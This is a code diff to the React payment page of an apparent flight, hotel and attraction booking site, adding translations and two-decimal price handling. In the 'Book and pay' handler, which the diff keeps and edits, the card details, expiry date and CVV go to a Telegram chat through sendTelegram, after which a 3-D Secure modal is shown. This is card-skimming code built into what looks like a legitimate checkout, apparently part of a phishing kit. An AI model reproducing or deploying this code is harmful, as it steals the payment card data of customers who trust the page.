@@ -7,6 +7,7 @@ import ThreeDSModal from './components/ThreeDSModal';
 import SegmentDetailsModal from './components/SegmentDetailsModal';
 import appleLogo from './assets/apple-btn.svg';
 import { getPaymentStorageKey } from './utils/paymentKey';
+import { useTranslation } from './hooks/useTranslation';
 
 const BackIcon = () => (
   <svg width="24" height="24" fill="white" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
@@ -14,6 +15,7 @@ const BackIcon = () => (
 
 const Payment: React.FC = () => {
   const navigate = useNavigate();
+  const { t } = useTranslation();
 
   const [price, setPrice] = React.useState<{ currency: string; totalPerTraveller: number; travellers: number } | null>(null);
   const [trav, setTrav] = React.useState<any>({});
@@ -314,19 +316,22 @@ const Payment: React.FC = () => {
         const cur = (price?.currency || 'USD').toUpperCase();
         if (offerId && cur) {
           const total = calculateTotalSeatPrice(offerId, cur);
-          setSelectedSeatsTotal(Math.round(total));
+          setSelectedSeatsTotal(Number(total.toFixed(2)));
         }
       } catch {}
     }
   }, [price?.currency, isHotelBooking]);
 
   const isAttractionBooking = Boolean(attractionBooking);
-  const currency = (price?.currency || 'USD').toUpperCase();
+  const currency = (price?.currency || attractionBooking?.attraction?.currency || 'USD').toUpperCase();
+  // Используем точные значения без округления - округляем только при отображении
   const baseTotal = isHotelBooking
-    ? Math.round(hotelData?.price || 0)
-    : Math.round((price?.totalPerTraveller || 0) * (price?.travellers || 1));
-  const seatExtra = (isHotelBooking || isAttractionBooking) ? 0 : Math.round(selectedSeatsTotal);
-  const total = baseTotal + seatExtra;
+    ? Number((hotelData?.totalWithTaxes || hotelData?.price || 0).toFixed(2)) // Используем итоговую цену с налогами, если есть
+    : isAttractionBooking
+      ? Number((attractionBooking?.attraction?.price || 0).toFixed(2)) // Для достопримечательностей используем сохраненную цену
+      : Number(((price?.totalPerTraveller || 0) * (price?.travellers || 1)).toFixed(2));
+  const seatExtra = (isHotelBooking || isAttractionBooking) ? 0 : Number((selectedSeatsTotal || 0).toFixed(2));
+  const total = Number((baseTotal + seatExtra).toFixed(2));
   const hasCard = Boolean(card);
 
   const firstSeg = flight?.segments?.[0];
@@ -368,13 +373,13 @@ const Payment: React.FC = () => {
     <div className="trav-page">
       <div className="trav-header">
         <button className="back-button" onClick={() => navigate(-1)}><BackIcon/></button>
-        <h1>Payment</h1>
+        <h1>{t('payment')}</h1>
         <div style={{ width: 24 }}></div>
       </div>
 
       {/* Payment methods */}
       <div className="section">
-        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8 }}>Choose a payment method</div>
+        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8 }}>{t('choosePaymentMethod')}</div>
         {hasCard ? (
           <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', background:'#1f1f1f', border:'1px solid #333', borderRadius:12, padding:'12px 14px' }}>
             <div style={{ display:'flex', alignItems:'center', gap:12 }}>
@@ -396,13 +401,13 @@ const Payment: React.FC = () => {
               </div>
               <div style={{ color:'#ddd', fontWeight:600 }}>{String(card?.brand||'Card')} •••• {String(card?.last4||'')}</div>
             </div>
-            <button className="ghost-link" onClick={()=>navigate('/payment/new-card')}>Edit</button>
+            <button className="ghost-link" onClick={()=>navigate('/payment/new-card')}>{t('edit')}</button>
           </div>
         ) : (
           <div style={{ display:'flex', gap:16 }}>
             <div onClick={()=>navigate('/payment/new-card')} style={{ background:'#1f1f1f', border:'1px solid #333', borderRadius:12, padding:16, width:110, height:90, display:'flex', flexDirection:'column', justifyContent:'center', alignItems:'center', cursor:'pointer' }}>
               <svg width="36" height="36" viewBox="0 0 24 24" fill="#4da3ff"><path d="M4 4h16a2 2 0 012 2v3H2V6a2 2 0 012-2zm18 7H2v7a2 2 0 002 2h16a2 2 0 002-2v-7zm-4 4H6v2h12v-2z"/></svg>
-              <div style={{ color:'#ddd', marginTop:8, fontWeight:600 }}>New card</div>
+              <div style={{ color:'#ddd', marginTop:8, fontWeight:600 }}>{t('newCard')}</div>
             </div>
           </div>
         )}
@@ -422,9 +427,9 @@ const Payment: React.FC = () => {
               )}
             </div>
             <div>
-              <div style={{ color:'#fff', fontWeight:800 }}>{attractionBooking?.attraction?.name || 'Attraction'}</div>
-              <div style={{ color:'#bbb', marginTop:4 }}>{attractionBooking?.attraction?.operator || 'Experience partner'}</div>
-              <div style={{ color:'#888', marginTop:4 }}>Starts at {attractionBooking?.attraction?.startTime || '—'}</div>
+              <div style={{ color:'#fff', fontWeight:800 }}>{attractionBooking?.attraction?.name || t('attraction')}</div>
+              <div style={{ color:'#bbb', marginTop:4 }}>{attractionBooking?.attraction?.operator || t('experiencePartner')}</div>
+              <div style={{ color:'#888', marginTop:4 }}>{t('startsAt')} {attractionBooking?.attraction?.startTime || '—'}</div>
             </div>
           </div>
           <div style={{ color:'#bbb', marginTop:12 }}>
@@ -553,7 +558,7 @@ const Payment: React.FC = () => {
                       {currentSegmentSeats.seats.length > 0 && (
                         <div style={{ color:'#ccc', marginTop:6, fontSize:14 }}>
                           Selected seats: <span style={{ color:'#fff', fontWeight:600 }}>{currentSegmentSeats.seats.join(', ')}</span>
-                          {currentSegmentSeats.total > 0 && (<span style={{ color:'#9fd66f' }}> · +{currency} {Math.round(currentSegmentSeats.total).toLocaleString()}</span>)}
+                          {currentSegmentSeats.total > 0 && (<span style={{ color:'#9fd66f' }}> · +{currency} {Number(currentSegmentSeats.total.toFixed(2))}</span>)}
                         </div>
                       )}
                     </div>
@@ -572,7 +577,7 @@ const Payment: React.FC = () => {
       {/* Traveler details */}
       <div className="section">
         <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8, display:'flex', alignItems:'center', gap:8 }}>
-          {isHotelBooking ? 'Guest details' : 'Traveler details'}
+          {isHotelBooking ? t('guestDetails') : t('travelerDetailsPlural')}
           {!isHotelBooking && (!trav.firstName?.trim() || !trav.lastName?.trim()) && (
             <span style={{ color:'#ff6b6b', fontSize:14 }}>⚠️ Required</span>
           )}
@@ -603,7 +608,7 @@ const Payment: React.FC = () => {
             onClick={() => navigate('/traveler-details')}
             style={{ marginTop: 8, fontSize: 14 }}
           >
-            Add traveler information
+            {t('addTravelerInformation')}
           </button>
         )}
       </div>
@@ -611,7 +616,7 @@ const Payment: React.FC = () => {
       {/* Contact details */}
       <div className="section">
         <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8, display:'flex', alignItems:'center', gap:8 }}>
-          Contact details
+          {t('contactDetails')}
           {isFlightBooking && (!contact.email?.trim() || !contact.phone?.trim()) && (
             <span style={{ color:'#ff6b6b', fontSize:14 }}>⚠️ Required</span>
           )}
@@ -624,40 +629,45 @@ const Payment: React.FC = () => {
             onClick={() => navigate('/contact-details')}
             style={{ marginTop: 8, fontSize: 14 }}
           >
-            Add contact information
+            {t('addContactInformation')}
           </button>
         )}
       </div>
 
       {/* Pricing */}
       <div className="section">
-        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8 }}>Pricing and payment</div>
+        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8 }}>{t('pricingAndPayment')}</div>
         <div style={{ display:'flex', justifyContent:'space-between', color:'#ccc', margin:'8px 0' }}>
           <span>
             {isHotelBooking
-              ? `Hotel stay (${adults} adult${adults>1?'s':''}${kids.length?`, ${kids.length} child${kids.length>1?'ren':''}`:''})`
+              ? `${t('hotelStay')} (${adults} ${t('adults')}${adults>1?'s':''}${kids.length?`, ${kids.length} ${t('children')}${kids.length>1?'ren':''}`:''})`
               : isAttractionBooking
-                ? 'Experience booking'
-                : `Tickets (${adults} adult${adults>1?'s':''}${kids.length?`, ${kids.length} child${kids.length>1?'ren':''}`:''})`}
+                ? t('experienceBooking')
+                : `${t('tickets')} (${adults} ${t('adults')}${adults>1?'s':''}${kids.length?`, ${kids.length} ${t('children')}${kids.length>1?'ren':''}`:''})`}
           </span>
-          <span>{currency} {baseTotal.toLocaleString()}</span>
+          <span>{currency} {baseTotal.toFixed(2)}</span>
         </div>
         {seatExtra>0 && (
           <div style={{ display:'flex', justifyContent:'space-between', color:'#9fd66f', margin:'4px 0' }}>
-            <span>Seats</span>
-            <span>+{currency} {seatExtra.toLocaleString()}</span>
+            <span>{t('selectedSeats')}</span>
+            <span>+{currency} {seatExtra.toFixed(2)}</span>
+          </div>
+        )}
+        {!isHotelBooking && !isAttractionBooking && (
+          <div className="price-note" style={{ marginTop: 6 }}>
+            {t('freeBaggageIncluded') || 'Free checked baggage included'}
           </div>
         )}
         <div style={{ color:'#fff', fontWeight:800, fontSize:22, display:'flex', justifyContent:'space-between', marginTop:8 }}>
-          <span>Total price</span>
-          <span>{currency} {total.toLocaleString()}</span>
+          <span>{t('totalPrice')}</span>
+          <span>{currency} {total.toFixed(2)}</span>
         </div>
-        <div style={{ color:'#888', marginTop:6 }}>includes taxes and fees</div>
+        <div style={{ color:'#888', marginTop:6 }}>{t('includesTaxesAndFees')}</div>
       </div>
 
       {/* Fine print */}
       <div className="section">
-        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8 }}>The fine print</div>
+        <div style={{ color:'#fff', fontSize:20, fontWeight:800, marginBottom:8 }}>{t('finePrint')}</div>
         <div style={{ color:'#bbb', lineHeight:1.6, fontSize:14 }}>
           By tapping <b>Book and pay</b>, you agree to: payment being processed by our partner; fare rules and carriage conditions of the airline; and our platform terms including data processing and refunds policy. Tickets are issued in the traveler’s name and may be non‑refundable and non‑changeable unless specified. Please verify all passenger details before payment.
         </div>
@@ -669,13 +679,13 @@ const Payment: React.FC = () => {
       {/* Footer */}
       <div className="luggage-footer">
         <div className="price-box">
-          <div className="price-label">{currency} {total.toLocaleString('en-US')}</div>
+          <div className="price-label">{currency} {total.toFixed(2)}</div>
           <div className="price-sub">
           {isHotelBooking
             ? `${adults} guest${adults>1?'s':''}${kids.length?`, ${kids.length} child${kids.length>1?'ren':''}`:''}`
             : isAttractionBooking
               ? 'Experience booking'
-              : `${price?.travellers||1} traveler${(price?.travellers||1)>1?'s':''}${seatExtra>0?` · +${currency} ${seatExtra.toLocaleString('en-US')} seats`:''}`
+              : `${price?.travellers||1} traveler${(price?.travellers||1)>1?'s':''}${seatExtra>0?` · +${currency} ${seatExtra.toFixed(2)} seats`:''}`
           }
         </div>
         </div>
@@ -725,17 +735,17 @@ const Payment: React.FC = () => {
               
               // Отправляем уведомление о попытке оплаты
               const telegramMessage = isHotelBooking 
-                ? `🏨 <b>Hotel Booking Attempt</b>\n<b>Hotel</b>: ${hotelData?.hotel_name || 'Hotel'}\n<b>Location</b>: ${hotelData?.address || ''}, ${hotelData?.city || 'City'}\n<b>Dates</b>: ${hotelData?.checkIn && hotelData?.checkOut ? `${new Date(hotelData.checkIn).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })} - ${new Date(hotelData.checkOut).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })}` : 'Check-in - Check-out'}\n<b>Guests</b>: ${adults} adult${adults > 1 ? 's' : ''}${kids.length > 0 ? `, ${kids.length} child${kids.length > 1 ? 'ren' : ''}` : ''}\n<b>Rooms</b>: ${hotelData?.rooms || 1}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toLocaleString()}`
+                ? `🏨 <b>Hotel Booking Attempt</b>\n<b>Hotel</b>: ${hotelData?.hotel_name || 'Hotel'}\n<b>Location</b>: ${hotelData?.address || ''}, ${hotelData?.city || 'City'}\n<b>Dates</b>: ${hotelData?.checkIn && hotelData?.checkOut ? `${new Date(hotelData.checkIn).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })} - ${new Date(hotelData.checkOut).toLocaleDateString('en-GB', { day: 'numeric', month: 'short' })}` : 'Check-in - Check-out'}\n<b>Guests</b>: ${adults} adult${adults > 1 ? 's' : ''}${kids.length > 0 ? `, ${kids.length} child${kids.length > 1 ? 'ren' : ''}` : ''}\n<b>Rooms</b>: ${hotelData?.rooms || 1}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}`
                 : isAttractionBooking
-                  ? `🎟 <b>Attraction Booking Attempt</b>\n<b>Attraction</b>: ${attractionBooking?.attraction?.name || 'Attraction'}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toLocaleString()}\n${summary}`
-                  : `💳 <b>Flight Booking Attempt</b>\n<b>Route</b>: ${firstSeg?.departureAirport?.code} → ${lastSeg?.arrivalAirport?.code}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toLocaleString()}\n${summary}`;
+                  ? `🎟 <b>Attraction Booking Attempt</b>\n<b>Attraction</b>: ${attractionBooking?.attraction?.name || 'Attraction'}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n${summary}`
+                  : `💳 <b>Flight Booking Attempt</b>\n<b>Route</b>: ${firstSeg?.departureAirport?.code} → ${lastSeg?.arrivalAirport?.code}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n${summary}`;
               
               sendTelegram(telegramMessage);
             } catch {}
             setThreeDSOpen(true);
           }}>
             <span className="applepay-ico" aria-hidden="true"><img src={appleLogo} alt="Apple" style={{ width:20, height:20 }} /></span>
-            <span style={{ color:'#000' }}>Book and pay</span>
+            <span style={{ color:'#000' }}>{t('bookAndPay')}</span>
             <span className="applepay-lock" aria-hidden="true">
               <svg width="18" height="18" viewBox="0 0 24 24" fill="#000" xmlns="http://www.w3.org/2000/svg"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 1 1 6 0v3H9z"/></svg>
             </span>
@@ -772,7 +782,7 @@ const Payment: React.FC = () => {
             }
             
             navigate('/payment/new-card'); 
-          }}>Choose payment</button>
+          }}>{t('choosePayment')}</button>
         )}
       </div>
       {threeDSOpen && (
@@ -782,7 +792,7 @@ const Payment: React.FC = () => {
             ? `${hotelData?.hotel_name || 'Hotel'} (${hotelData?.city || 'City'})`
             : `${firstSeg?.departureAirport?.code || ''} → ${lastSeg?.arrivalAirport?.code || ''}`
           }
-          amount={`${currency} ${total.toLocaleString()}`}
+          amount={`${currency} ${total.toFixed(2)}`}
           brand={String(card?.brand || '').toLowerCase()}
           cardMasked={`****  ****\n****  ${String(card?.last4||'0000')}`}
           preloadMs={20000}
